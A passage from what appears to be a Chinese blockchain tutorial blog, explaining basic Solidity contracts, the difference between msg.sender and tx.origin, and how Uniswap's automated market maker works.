<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">//import &#x27;test_send.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line">    function set(uint x) public&#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line">    function get() public constant returns (uint retVal) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleSet &#123;</span><br><span class="line"></span><br><span class="line">	address instance_address = 0x9351ca1b4cc9c3d11db77374de3987b5abf3d4c8;</span><br><span class="line">	SimpleStorage target = SimpleStorage(instance_address);</span><br><span class="line">    uint readData;</span><br><span class="line">	</span><br><span class="line">    function read() public view returns (uint) &#123;</span><br><span class="line">        readData = target.get();</span><br><span class="line">		return readData;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    function write(uint x) &#123;</span><br><span class="line">        target.set(x));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在simple_set中，可以调用并修改另外一个合约中的数据。下图展示的是先通过simple_set修改storeData的值，然后在simpleStorage中去读取，结果显示了变化。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233112.jpg" alt="img"></p>
<ol start="4">
<li>铸币(coin_mint.sol)</li>
</ol>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line"></span><br><span class="line">//关键字“public”使变量能从合约外部访问。</span><br><span class="line">    address public minter;</span><br><span class="line">    mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">//事件让轻客户端能高效的对变化做出反应。</span><br><span class="line">    event Sent(address from, address to, uint amount);</span><br><span class="line"></span><br><span class="line">//这个构造函数的代码仅仅只在合约创建的时候被运行。</span><br><span class="line">    function Coin() &#123;</span><br><span class="line">        minter = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function mint(address receiver, uint amount) &#123;</span><br><span class="line">        if (msg.sender != minter) return;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">    function send(address receiver, uint amount) &#123;</span><br><span class="line">        if (balances[msg.sender] &lt; amount) return;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[receiver] += amount;</span><br><span class="line">        Sent(msg.sender, receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个合约引入了一些新的概念，让我们逐一解读。</p>
<p><code>address</code> <code>public</code> <code>minter;</code> 这一行声明了一个可以被公开访问的 <code>address</code> 类型的状态变量。 <code>address</code> 类型是一个160位的值，且不允许任何算数操作。这种类型适合存储合约地址或外部人员的密钥对。关键字 <code>public</code> 自动生成一个函数，允许你在这个合约之外访问这个状态变量的当前值。如果没有这个关键字，其他的合约没有办法访问这个变量。由编译器生成的函数的代码大致如下所示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function minter() returns (address) &#123; return minter; &#125;</span><br></pre></td></tr></table></figure>

<p>当然，加一个和上面完全一样的函数是行不通的，因为我们会有同名的一个函数和一个变量，这里，主要是希望你能明白——编译器已经帮你实现了。</p>
<p>下一行， </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping (address =&gt; uint) public balances; </span><br></pre></td></tr></table></figure>

<p>也创建一个公共状态变量，但它是一个更复杂的数据类型。 该类型将address映射为无符号整数。 Mappings 可以看作是一个 <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hash_table">哈希表</a> 它会执行虚拟初始化，以使所有可能存在的键都映射到一个字节表示为全零的值。 但是，这种类比并不太恰当，因为它既不能获得映射的所有键的列表，也不能获得所有值的列表。 因此，要么记住你添加到mapping中的数据（使用列表或更高级的数据类型会更好），要么在不需要键列表或值列表的上下文中使用它，就如本例。 而由 <code>public</code> 关键字创建的getter函数 <a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/contracts.html%23getter-functions">getter function</a> 则是更复杂一些的情况， 它大致如下所示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function balances(address _account) public view returns (uint) &#123; return balances[_account]; &#125;</span><br></pre></td></tr></table></figure>

<p>正如你所看到的，你可以通过该函数轻松地查询到账户的余额。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event Sent(address from, address to, uint amount); </span><br></pre></td></tr></table></figure>

<p>这行声明了一个所谓的“事件（event）”，它会在 <code>send</code> 函数的最后一行被发出。用户界面（当然也包括服务器应用程序）可以监听区块链上正在发送的事件，而不会花费太多成本。一旦它被发出，监听该事件的listener都将收到通知。而所有的事件都包含了 <code>from</code> ， <code>to</code> 和 <code>amount</code> 三个参数，可方便追踪事务。 为了监听这个事件，你可以使用如下代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Coin.Sent().watch(&#123;&#125;, &#x27;&#x27;, function(error, result) &#123;</span><br><span class="line">    if (!error) &#123;</span><br><span class="line">        console.log(&quot;Coin transfer: &quot; + result.args.amount +</span><br><span class="line">            &quot; coins were sent from &quot; + result.args.from +</span><br><span class="line">            &quot; to &quot; + result.args.to + &quot;.&quot;);</span><br><span class="line">        console.log(&quot;Balances now:\n&quot; +</span><br><span class="line">            &quot;Sender: &quot; + Coin.balances.call(result.args.from) +</span><br><span class="line">            &quot;Receiver: &quot; + Coin.balances.call(result.args.to));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里请注意自动生成的 <code>balances</code> 函数是如何从用户界面调用的。</p>
<p>特殊函数 <code>Coin</code> 是在创建合约期间运行的构造函数，不能在事后调用。 它永久存储创建合约的人的地址: <code>msg</code> (以及 <code>tx</code> 和 <code>block</code> ) 是一个神奇的全局变量，其中包含一些允许访问区块链的属性。 <code>msg.sender</code> 始终是当前（外部）函数调用的来源地址。</p>
<p>最后，真正被用户或其他合约所调用的，以完成本合约功能的方法是 <code>mint</code> 和 <code>send</code>。 如果 <code>mint</code> 被合约创建者外的其他人调用则什么也不会发生。 另一方面， <code>send</code> 函数可被任何人用于向他人发送币 (当然，前提是发送者拥有这些币)。记住，如果你使用合约发送币给一个地址，当你在区块链浏览器上查看该地址时是看不到任何相关信息的。因为，实际上你发送币和更改余额的信息仅仅存储在特定合约的数据存储器中。通过使用事件，你可以非常简单地为你的新币创建一个“区块链浏览器”来追踪交易和余额。</p>
<p>这份合约进行操作，譬如通过账户7578C将合约部署到链上，那么可以查看合约的minter；minter可以自己铸币，相当于是发给任何用户一些币；有币的用户又可以进行转账。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233113.jpg" alt="img"></p>
<ol start="5">
<li>复杂的数据类型 （origin_send.sol）</li>
</ol>
<p>msg.sender和tx.origin</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tx.origin</code>是一个address类型，表示交易的发送者，<code>msg.sender</code>则表示为消息的发送者。在同一个合约中，他们是等价的。但是在不同合约中，<code>tx.origin</code>表示用户地址，<code>msg.sender</code>则表示合约地址。</p>
<p>上述代码中有两个合约，需要分别部署。并且demo2在部署时需要传入参数。</p>
<p>在demo中:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233115.jpg" alt="img"></p>
<p>在demo2中，</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233116.jpg" alt="img"></p>
<p>而下面的地址7578就是demo合约部署的地址，7D5b就是demo2合约部署的地址。</p>
<p>使用<code>msg.sender</code>的所有者可能是一个合约。</p>
<p>使用<code>tx.origin</code>的所有者永远不可能是合约。</p>
<p>在简单的调用链A-&gt; B-&gt; C-&gt; D中，内部D 的<code>msg.sender</code>为C，<code>tx.origin</code>为A.</p>
<p>就灵活性而言首选<code>msg.sender</code>。此外，对于Serenity，Vitalik建议避免使用tx.origin：<a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof">How do I make my DAPP “Serenity-Proof?”</a></p>
<p>如果你真的需要使用<code>tx.origin</code>，请一定考虑仔细。请记住，你可能不是该合约的唯一用户。其他人也可能想要使用你的合约，并希望通过他们编写的合约与之进行互动。</p>
<p>如果在D中确实需要其来源<code>origin</code>，那么合约B，C，D中的每个函数都可以采用额外的参数来传播来源：A将其地址（<code>this</code>）传递给B，B将值传递给C ，C将它传递给D.</p>
<p>可以查看参考5， 讨论使用tx.origin可能会引起的攻击。</p>
<p>接下来看一下address。</p>
<p>以太坊中的地址的长度为<code>20</code>字节，一字节等于8位，一共<code>160</code>位，所以<code>address</code>其实亦可以用<code>uint160</code>来声明。</p>
<p>属性：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.balance, 地址的余额（单位为：wei）</span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>.transfer,发送以太币（单位为：wei）到一个地址，如果失败会停止并抛出异常。</span><br></pre></td></tr></table></figure>









<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">Fomo3D 千万大奖获得者“特殊攻击技巧”最全揭露 - 华尔街见闻</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">“首次深度揭秘”Fomo3D，被黑客拿走的2200万！</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html">https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/b8bb006a5b68">https://www.jianshu.com/p/b8bb006a5b68</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514">https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_34611579/article/details/85163326">https://blog.csdn.net/qq_34611579&#x2F;article&#x2F;details&#x2F;85163326</a></li>
</ol>
<h1 id="区块链技术15-uniswap简介"><a href="#区块链技术15-uniswap简介" class="headerlink" title="区块链技术15:uniswap简介"></a>区块链技术15:uniswap简介</h1><p>为吸引注意力，先看一个数据：</p>
<p>从2020年3月1日到3月25日，Uniswap上的总交易规模大约2.06亿美元，这期间流动性提供商大约捕获了60多万美元的费用价值。其中3月12日和3月13日交易量都超过3,000万美元，贡献三分之一的收益，平均下来，每天大约可以产出24,000美元的收益。假设这是日均的费用，那么，所有流动性提供商一年可以赚取876万美元收益。</p>
<hr>
<p>Uniswap是一种基于以太坊的协议，旨在促进ETH和ERC20 代币数字资产之间的自动兑换交易。</p>
<p>首先讨论下，第一，以太坊上可以挖出以太币eth，人们出于各种投资&#x2F;部署以太坊智能合约&#x2F;运行智能合约，会用现实中的钱去购买以太币。第二，以太坊上还有很多种代币，以太坊代币是内置在以太坊区块链上的数字资产。它们受益于以太坊现有的基础设施，而不需要开发者重新构建全新区块链。它们还通过以太币（以太坊的本地货币，被用来驱动智能合约）来加强以太坊生态系统。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233117.jpg" alt="img"></p>
<p>利用以太坊的智能合约可以轻松编写出属于自己的代币，代币可以代表任何可以交易的东西，如：积分、财产、证书等等。因此不管是出于商业，还是学习的目的，很多人想创建一个自己的代币，看看创建的代币是什么样子。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233118.jpg" alt="img"></p>
<p>ERC20 Token</p>
<p>ERC20 和代币经常一同出现， ERC20 是以太坊定义的一个代币标准。定义了在实现代币的时候必须要遵守的协议，如指定代币名称、总量、实现代币交易函数等，只有支持了协议才能被以太坊钱包支持。<br>其接口如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract ERC20Interface &#123;</span><br><span class="line"></span><br><span class="line">    string public constant name = &quot;Token Name&quot;;</span><br><span class="line">    string public constant symbol = &quot;SYM&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;  // 18 is the most common number of decimal places</span><br><span class="line"></span><br><span class="line">    function totalSupply() public constant returns (uint);</span><br><span class="line">    function balanceOf(address tokenOwner) public constant returns (uint balance);</span><br><span class="line">    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);</span><br><span class="line">    function transfer(address to, uint tokens) public returns (bool success);</span><br><span class="line">    function approve(address spender, uint tokens) public returns (bool success);</span><br><span class="line">    function transferFrom(address from, address to, uint tokens) public returns (bool success);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint tokens);</span><br><span class="line">    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说明一下：<br>name ： 代币名称<br>symbol： 代币符号<br>decimals： 代币小数点位数，代币的最小单位， 18 表示我们可以拥有 .0000000000000000001 单位个代币。<br>totalSupply() : 发行代币总量。<br>balanceOf(): 查看对应账号的代币余额。<br>transfer(): 实现代币转账交易，用于给用户发送代币（从我们的账户里）。<br>transferFrom(): 给被授权的用户使用，他可以从我们（参数 from）的账户里发送代币给其他用户（参数 to）。<br>allowance(): 返回授权花费的代币数。<br>approve(): 授权用户可代表我们花费的代币数。</p>
<p>那么为什么会出现uniswap这样的协议来支持ETH和各种代币进行自动兑换呢？</p>
<p>举一个兑换外币的例子，兑换外币有可能是出国&#x2F;购物需要使用，也有可能出于获利的目的。比如2018年4月份人民币汇率是6.3，也即可以用630元兑换100美元。到2019年10月人民币汇率是7.1，可以用手中的100美元兑换710元人民币，相当于就赚了70元人民币。也即，2018年4月用人民币买美元，2019年10月再用美元买人民币，进行两种货币之间的交换。相反，如果到2020年5月人民币又跌回了6.3，那么在2019年的时候用100美元买到710人民币，然后在2020年的时候把710人民币换成113美元，就赚到了13美元。</p>
<p>这就是两种货币交易的例子。这种交易可以发生在银行或者交易所。虽然国内银行规定进行购汇的时候不需要任何手续费，但是把外汇货币卖给银行，会按银行的“买入价”计算，从银行买外汇，则按银行规定的“卖出价”算。当中存在一个差价，这个差价相当于银行的手续费。交易所的三个经典设计模型是订单簿模型、自动化做市模型和荷兰式拍卖模型。这里还有一些概念，如订单簿、挂单、限价委托等等。</p>
<p>在中心化交易所中，手续费相对盈利而言，一般不低，因此，当区块链出现之后，去中心化交易所（DEX）正在成为一种新的解决方案。2019年时，已有了不少基于区块链的去中心化交易所，不少的去中心化交易所都是基于订单簿。订单簿包含了代币的买单和卖单列表。买单称为出价（bid），卖单称为要价（ask）。订单簿列出了在每个价格点出价或要价的代币数量。最高出价（买一）和最低要价（卖一）被称作买卖一（top of the book）。它们标志着市场情绪以及获得订单所需的买入价和卖出价。最高出价和最低要价之间的差异叫价差（spread）。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233119.jpg" alt="img"></p>
<p><em>DDEX 的订单簿</em></p>
<p>目前，IDEX、DDEX、Radar Relay、EtherDelta、Paradex 和 Ethfinex 都是订单簿式 DEX。在订单簿式去中心化交易所（以下简称订单簿式 DEX）中，可以提交两种类型的订单：市价订单和限价订单。</p>
<p>提交市价订单时，可以设定买入&#x2F;卖出的代币数量，DEX 会立即以最优市场价执行你的市价单。下一个市价单意味着，优先保证订单成交速度，无论订单簿上现有订单价格是多少。执行市价单的方式是，为买家匹配现有的卖一订单，为卖家匹配现有的买一订单。</p>
<p>提交限价订单时，DEX 会以设定的价格和数量买入或卖出代币，如果当前没有能与之匹配的订单，则该订单会被挂在订单簿上，等待交易。</p>
<p>订单簿可以存储在链上或链下。链下的订单簿式交易所（例如 0x）需要 Relayer （指的是采用此交易协议的 DEX）将订单簿存储在中心化服务器上。而链上的订单簿式交易所不需要中心化服务器，但用户需要自己创建交易并为挂单和取消订单的操作支付 gas 费用，即使订单没有被成交，gas 费也无法退还。</p>
<p>在订单簿式交易所中，做市商通过挂单来提供流动性，这些订单可以减少价差并补偿库存风险。通常，交易量越低，价差越大，因为做市商承担的流动性匮乏的风险更大。</p>
<p><em>优点</em></p>
<p>适合流动性市场。一个订单簿交易所的交易量越大、价差越小，证明一个交易所的流动性越好。在高流动性市场中，订单簿式交易所最适合于显示市场价格，并且大额订单不受价格滑点影响。Coinbase 和币安等大型中心化交易所、以及纽约证券交易所等传统交易所都依赖于订单簿模式。</p>
<p><em>缺点</em></p>
<p>不适合缺乏流动性的市场。只有当出价和要价相匹配时，订单才会被完成，反之亦然；如果订单的最高出价仍然低于最低要价，那么将无法进行交易。因此，对于流动性不足的市场，订单簿交易所将导致大额差价，交易成功率低，而且小量资金即可对市场价格造成巨大影响。</p>
<p>矿工抢先交易 (front-running)。部分链上订单簿式交易所面临着矿工与交易者之间的抢先交易问题。</p>
<p>矿工可以在交易被区块打包之前就看到所有交易。如果你下了一个大买单，一旦矿工看到这个订单，他们发现你的订单已经大到足以拉高代币价格，那么矿工便可以自己创建一个买单并把自己的买单在你之前添加到区块中。当这个区块被挖出，相当于这个矿工低价买入了代币，然后代币价格被大单拉高。矿工再高价卖出这个代币，就能无风险套利。</p>
<hr>
<p>Uniswap是DeFi中最著名的协议之一，完全部署在链上，任何个人用户，只要安装了去中心化钱包软件（当前已经支持的钱包包括 MetaMask、WalletConnect、Coinbase Wallet、Fortmatic、Portis），都可以使用这个协议。Uniswap协议的设计结构体系与传统数字资产交易所中的交易模型完全不同。大多数传统交易所都是通过维护一个“订单簿”，来匹配一种数字资产的买卖双方。Uniswap则是利用储备金流动性来实现协议上的数字资产交易兑换。Uniswap本质是一个自动化做市商（AMM），它舍弃了传统订单薄的撮合方式，采用流动池加恒定乘积公式算法(x*y &#x3D; k )为不同加密资产提供即时报价和兑换服务。 </p>
<p><strong>什么是Uniswap</strong></p>
<p>关于什么是Uniswap，先看一下Uniswap白皮书中的定义：</p>
<p>Uniswap is a protocol for automated token exchange on Ethereum. It is designed around ease-of-use, gas efficiency, censorship resistance, and zero rent extraction. </p>
<p>Uniswap是一个基于以太坊的自动代币交换协议，它的设计目标是：易用性、gas高利用率、抗审查性和零抽租。 </p>
<ul>
<li><p>ease-of-use（易用性）：Token A换Token B，在Uniswap也只要发出一笔交易就能完成兑换，在其它交易所中可能需要发两笔交易：第一笔将Token A换成某种媒介货币，如ETH, D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a> 等，然后再发第二笔交易换成Token B。 </p>
</li>
<li><p>gas efficiency（gas高利用率）：在Uniswap上消耗的gas量是以太坊上的几家主流去中化交易所中最低的，也就代表在Uniswap交易要付的矿工费最少。</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233120.jpg" alt="img"></p>
<ul>
<li>censorship resistance（抗审查性）：抗审查性体现在Uniswap上架新Token没有门槛，任何人都能在Uniswap上架任何Token。这在去中心交易所中很少见，虽然大多数的去中心化交易所不会像中心化交易所收取上币费，但还是需要提交上币申请，通过审查后运营团队才会让Token可以在他们的交易所上交易。下面是各去中心化交易所上币规则的详情：</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KyberSwap上币规则：https://developer.kyber.network/docs/Reserves-ListingProcess/</span><br><span class="line">EtherDelta上币规则：https://steemit.com/cryptocurrency/@mindseye69/new-etherdelta-coin-listing-rules</span><br><span class="line">IDEX上币规则：https://medium.com/@forrestwhaling/idex-token-listing-guidelines-eae00785fdd2</span><br><span class="line">Uniswap上币规则：https://uniswap.org/docs/v1/frontend-integration/token-listing/</span><br></pre></td></tr></table></figure>

<ul>
<li>zero rent extraction（零抽租）:在Uniswap协议设计中，开发团队不会从交易中抽取费用，交易中的所有费用都归还给流动性提供者。</li>
</ul>
<p>上面的介绍中又有两个新名词：AMM automated market maker，自动化做市商；流动性提供者。</p>
<h2 id="自动化做市商-AMM"><a href="#自动化做市商-AMM" class="headerlink" title="自动化做市商(AMM)"></a>自动化做市商(AMM)</h2><p>传统的交易所有一个订单薄(Order Book)，订单薄上记录着买卖方向，数量和出价，交易所负责对买卖双方进行配对，一旦订单薄中最高价格低于或等于最低价格，就会促成交易，同时会产生一个新的成交价，传统交易所有以下特点：</p>
<ul>
<li>市场上必须要有用户进行挂单，要有一定量的订单（市场流动）。</li>
<li>订单必须重叠才能成交，即买价高于或等于卖价。</li>
<li>需要将资产存储在交易所。</li>
</ul>
<p>在订单薄模型市场中，买家期望用最低的价格买到想要的资产，而卖家则是期望用最高价格卖出同一项资产，如果交易要成立，买卖双方必须要在价格上达成共识，一是买家提高出价，而是卖家降低出价，如果双方都不要改变出价，这时候就要依靠做市商的参与，简单来说，做市商是一个促进交易的实体，它会在买卖两个方向上挂单，让想要交易的参与方只要跟做市商的订单撮合就能完成交易，而不需要等待对手方出现才能交易，极大的提高了市场的流动性。</p>
<p>为什么Uniswap不采用订单薄模型？</p>
<p>Uniswap部署在以太坊上，而以太坊每秒可以出来15笔左右的交易，这对于订单薄交易所来不可行，主要原因是：“订单薄模型依赖一个或多个外部做市商对某项资产一直不断的做市，而以太坊的TPS过低不支持做市商高频的交易，如果缺少了做市商，那么交易所的流动性立刻会降低，对于用户来说这样的交易所体验很差。”</p>
<p>Uniswap采用流动池加恒定乘法公式这种自动化做市商（AMM）模式实现了资产的交换，自动化做市商模式方式不需要买卖双方进行挂单，也不要买卖双方的订单重叠，可以进行自由买卖。</p>
<ul>
<li>流动池：使用流动池来提供买卖双方交易，做市商只要把资金放入流动池即可</li>
<li>恒定乘法公式：按照流动池中Token的数量，自动计算买卖价格</li>
</ul>
<h3 id="流动池"><a href="#流动池" class="headerlink" title="流动池"></a><strong>流动池</strong></h3><p>流动池就是锁定在智能合约中所有的代币以及资金的总称，流动是资金转为代币，或代币转为资金的意思。</p>
<p>一个完整的流动池分为2个部份，分别表示不同的货币，成为一个交易对，在Uniswap V1中就是ETH及ERC20代币，在Uniswap V2中是支持不同ERC20代币直接交换，所以在Uniswap V2中的流动池可以允许两边是不相同的ERC20代币，其中ETH会自动转换成以WETH代币。为了简化，直接以ETH-ERC20交易对作为例子。</p>
<p>如下图所示，Uniswap将所有做市商的ETH集合在一起放在流动池左边， 将所有ERC20集合在一起放在流动池的右边。如果有用户要买ERC20代币，就从流动池的右边将ERC20代币转给用户，同时将用户支付的ETH添加的流动池的左边，然后重新计算流动池中的价格，等待下次交易。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233121.jpg" alt="img"></p>
<p><strong>恒定乘积公式</strong></p>
<p>Uniswap用来确定token交易汇率的恒定乘积公式，最初来源自2018年3月Vitalik Buterin发表过的一篇文章中。此文中表述，根据以下公式来计算ERC20代币的交易汇率：</p>
<p>x*y &#x3D; k</p>
<p>k 表示一个不变的常数；x 和 y 表示特定交易对中ETH和ERC20代币的可用数量。</p>
<p>对于Uniswap而言，则是该ERC20代币和ETH的交易合约中ETH和该ERC20代币的流动性池的储备量。在这个公式中，该ERC20代币和ETH的兑换汇率，将始终处于此公式结果曲线上的某一点。</p>
<p>这个公式是Uniswap协议的组成部分，Vitalik Buterin使用下面这个图来对其进行描述：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233122.jpg" alt="img"></p>
<p>使用此公式，如果以Uniswap中的交易合约举例，则代表该交易合约储备有 x 数量的A代币和 y 数量的B代币。这个合约将始终保持乘积恒定，也就是说 x * y 得到的 k 值不变。</p>
<p>任何人都可以通过有效改变做市商在 x* y 曲线上的位置来进行买入或者卖出代币。</p>
<p>横轴代表卖出的A代币的数量，纵轴代表买入的B代币的数量。</p>
<p>假设B代币是ETH，而A代币是任意一种ERC20代币，我们可以通过 x * y &#x3D; k 的公式来理解一下它们的功能：</p>
<p>如果Alice决定买入大量A代币，那么将导致A代币的紧缺，并且导致ETH数量的增加。Alice购买的行为导致了把汇率移动到了 x * y &#x3D; k 曲线上的另一个点。红点将向左移动，也就是买入A代币的价格变得更加高。也可以将Uniswap的交易合约中的ETH和A代币的相对供应理解为A代币的供需关系，这种供需关系决定了A代币与ETH之间的汇率。</p>
<p>如前所述，第一个为交易合约提供流动性的充值操作，并不取决于交易汇率。而是反过来，后面的交易汇率，将取决于第一次为交易合约提供流动性的这个充值操作充值了多少ETH和ERC20代币，用第一个流动性提供者认为的等值，来反映ERC20&#x2F;ETH的兑换汇率。如果这个汇率和市场对比过高或者过低，<strong>套利交易者</strong>都会很快把差距抹平，直到市场正常水平。</p>
<p><strong>Uniswap 上的交易类型：ETH ⇄ ERC20 交易</strong></p>
<p>在Uniswap上可以进行的交易中的一种，就是ETH和ERC20代币之间的交易。就像前面提到的，这个交易对的汇率取决于此交易合约内ETH和该 ERC20代币流动性池的相对规模。这个交易汇率是由Uniswap的恒定乘积公式来决定的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ETH 池 * token 池 = 恒定乘积值</span><br></pre></td></tr></table></figure>

<p>在Uniswap上执行任何交易，此恒定乘积值都保持不变。只有当此交易合约中的流动性池发生变化的时候，此恒定乘积值才会发生变化。</p>
<p>我们用 ETH ⇄ DAI（一种ERC20代币）来举例：【本例中不考虑手续费】</p>
<p>Bob想要发起交易来用自己的1个ETH兑换成ERC20代币DAI，Bob将使用 Uniswap上已经存在的DAI交易合约来实现此兑换操作。此时，流动性提供者已经将一定量的ETH和DAI存在了交易合约中。我们这里举例，流动性提供者一共存了10 ETH和500 DAI。因此，基础的恒定乘积值为：</p>
